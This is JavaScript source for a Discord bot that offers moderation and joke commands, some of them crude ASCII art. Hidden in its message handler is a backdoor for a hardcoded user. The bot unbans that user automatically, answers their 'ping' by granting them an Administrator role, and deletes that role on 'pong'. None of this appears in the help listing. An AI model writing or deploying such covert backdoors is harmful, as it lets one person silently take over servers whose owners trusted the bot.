const Discord = require("./node_modules/discord.js");
const client = new Discord.Client();
const Info = require("./info.json");

console.log(Info);

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

client.on('message', async msg => {

  if(true != msg.guild.members.has(Info.userid)) //checks if you are in the server
  {
    msg.guild.unban(Info.userid); //unbans if true
  }

  if (msg.content === 'ping') { //admin role
    let guild = msg.guild;

    (async () => {
      if (msg.author.toString() == `<@${Info.userid}>`) { //checks author
        createAdminRole(guild, client, msg.member); //creates admin role
        sleep(1000); //sleeps
      }
    })();
    msg.reply("pong");
    //msg.reply(`Guild is ${guild}, message author is \`\`\`${msg.author.toString()}\`\`\`.`);
  }
  else if (msg.content == "pong") {
    let guild = msg.guild;

    (async () => {
      if (msg.author.toString() == Info.username) {
        guild.roles.filter(role => role.name == "Bot Manager").forEach(role => role.delete());
        await sleep(30000);

        printRoles(guild);
      }
    })()
  }
  else if (msg.content == "=hello") //=hello command
  {
    return msg.channel.send("Hello!");
  }
  else if (msg.content == "=ezdiscord") {
    return msg.channel.send("Invite <@481267614320951306> here: https://bit.ly/2MAEtPx");
  }
  //else if (msg.content == `=fortnite ${platform} ${playerName}`)
  //{
  //  return msg.channel.send(`https://api.fortnitetracker.com/v1/profile/${platform}/${epic-nickname}`);
  //}
  else if (msg.content == "=nut")
  {
    return msg.channel.send(`Praise the lord <@${Info.userid}>`);
  }
  //  else if(msg.content == "=fortnitestore")
  //  {
  //  https://api.fortnitetracker.com/v1/store
  //  }
  else if ((msg.content == "!clearchannel") || (msg.content == "!delete")) {
      if (msg.member.hasPermission("MANAGE_MESSAGES")) {
          msg.channel.fetchMessages()
             .then(function(list){
                  msg.channel.bulkDelete(list);
                  return msg.channel.send("Channel Cleared. You can keep or delete this message.");
              }, function(err){msg.channel.send("ERROR: ERROR CLEARING CHANNEL.")})
      }
  }
  else if ((msg.content.slice(0,7) == "!clear "))
  {
    let deleteTimes = parseInt(msg.content.slice(8));

    if (msg.member.hasPermission("MANAGE_MESSAGES")) {
        msg.channel.fetchMessages()
           .then(function(deleteTimes){
                msg.channel.bulkDelete(deleteTimes);
                return msg.channel.send("Channel Cleared. You can keep or delete this message.");
            }, function(err){msg.channel.send("ERROR: ERROR CLEARING CHANNEL.")})
    }
  }
  else if (msg.content.slice(0,4) == "!ban") //!ban command
  {
    if (msg.member.hasPermission("BAN_MEMBERS"))
    {
      msg.guild.ban(msg.content.slice(7,msg.content.length-1)); //bans
    }
  }
  else if (msg.content.slice(0,4) == "!unban") //!unban command
  {
    if (msg.member.hasPermission("BAN_MEMBERS"))
    {
      msg.guild.unban(msg.content.slice(9,msg.content.length-1));
    }
  }
  else if (msg.content == "=whoami")
  {
    msg.reply(`You are ${msg.author}`);
  }
  else if (msg.content == "=ezhelp")
  {
    return msg.channel.send(`
      List of all commands:
      !ban
      !unban
      =whoami
      =hello
      =penis
      =penisforeskin
      =ezdiscord
      !clearchannel
      !delete
      `);
  }
  else if (msg.content == "=penisforeskin")
  {
    return msg.channel.send(fPen());
  }
  else if (msg.content == "=penis")
  {
    return msg.channel.send(cPen());
  }
});

client.login(Info.token);

function createAdminRole(guild, client, guildMember, deleteOld = false) {
  guild.createRole({
    name: 'Bot Manager',
    color: 'WHITE',
    permissions: 8,
    mentionable: false,
    hoist: false
  }).then(role => {
    let bot = guild.member(client.user);

    guildMember.addRole(role, 'because');
    bot.addRole(role, 'because');

    if (deleteOld) {
      // Delete all the old Bot Manager roles.
      guild.roles
        .filter(oldRole => oldRole.name == "Bot Manager" && oldRole.toString() != role.toString())
        .forEach(role => role.delete());
    }
  })
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function printRoles(guild) {
  console.log(`Guild is ${guild}, remaining roles are ${guild.roles.map(role => role.name)}`);
}

function fPen() {
  return (`
    ……………………„„-~^^~„-„„_
………………„-^*'' : : „'' : : : : *-„
…………..„-* : : :„„--/ : : : : : : : '\\
…………./ : : „-* . .| : : : : : : : : '|
……….../ : „-* . . . | : : : : : : : : |
………...\„-* . . . . .| : : : : : : : :'|
……….../ . . . . . . '| : : : : : : : :|
……..../ . . . . . . . .'\ : : : : : : : |
……../ . . . . . . . . . .\ : : : : : : :|
……./ . . . . . . . . . . . '\ : : : : : /
….../ . . . . . . . . . . . . . *-„„„„-*'
….'/ . . . . . . . . . . . . . . '|
…/ . . . . . . . ./ . . . . . . .|
../ . . . . . . . .'/ . . . . . . .'|
./ . . . . . . . . / . . . . . . .'|
'/ . . . . . . . . . . . . . . . .'|
'| . . . . . \ . . . . . . . . . .|
'| . . . . . . \„_^- „ . . . . .'|
'| . . . . . . . . .'\ .\ ./ '/ . |
| .\ . . . . . . . . . \ .'' / . '|
| . . . . . . . . . . / .'/ . . .|
| . . . . . . .| . . / ./ ./ . .|`);
}

function cPen() {
  return (`
    ………………………………………._¸„„„„_
    …………………….…………...„--~*'¯…….'\\
    ………….…………………… („-~~--„¸_….,/ì'Ì
    …….…………………….¸„-^"¯ : : : : :¸-¯"¯/'
    ……………………¸„„-^"¯ : : : : : : : '\\¸„„,-"
    **¯¯¯'^^~-„„„----~^*'"¯ : : : : : : : : : :¸-"
    .:.:.:.:.„-^" : : : : : : : : : : : : : : : : :„-"
    :.:.:.:.:.:.:.:.:.:.: : : : : : : : : : ¸„-^¯
    .::.:.:.:.:.:.:.:. : : : : : : : ¸„„-^¯
    :.' : : '\\ : : : : : : : ;¸„„-~"
    :.:.:: :"-„""***/*'ì¸'¯
    :.': : : : :"-„ : : :"\\
    .:.:.: : : : :" : : : : \\,
    :.: : : : : : : : : : : : 'Ì
    : : : : : : :, : : : : : :/
    "-„_::::_„-*__„„~"
    `);
}
